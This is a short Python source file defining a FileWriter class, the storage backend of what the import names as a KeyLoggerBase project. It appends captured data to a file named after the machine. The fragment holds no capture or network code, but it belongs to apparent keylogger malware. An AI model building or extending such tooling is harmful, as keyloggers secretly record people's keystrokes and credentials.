from KeyLoggerBase import IFileWriter


class FileWriter(IFileWriter):
    def send_data(self,data:str,machine_name:str) ->None:
        with open(machine_name,"a") as f:
            f.write(data)

